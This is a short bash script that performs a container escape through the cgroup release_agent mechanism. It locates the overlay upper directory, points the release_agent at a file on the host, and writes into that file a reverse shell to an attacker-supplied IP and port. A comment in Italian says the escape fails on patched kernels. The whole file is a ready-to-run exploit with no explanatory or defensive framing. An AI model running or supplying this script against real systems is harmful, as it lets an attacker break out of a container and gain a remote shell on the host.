#!/bin/bash



mount -t cgroup -o $3 cgroup /tmp/cgrp;
mkdir /tmp/cgrp/x;
echo 1 > /tmp/cgrp/x/notify_on_release;
UPPERDIR=$(cat /etc/mtab | grep overlay | awk -F "," '{ for (i=1; i<=NF; i++) { if ($i ~ /upperdir/) { print $i } } }' | cut -d "=" -f 2);

if echo "$UPPERDIR/cmd" > /tmp/cgrp/release_agent; then
    echo '#!/bin/bash' > /cmd;
    echo "/bin/bash -i >& /dev/tcp/$1/$2 0>&1 2>&1" >> /cmd;
    chmod 777 /cmd;
    sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs";
else
    echo "[x] kernel patchato: impossibile completare la fuga"
    exit 1
fi
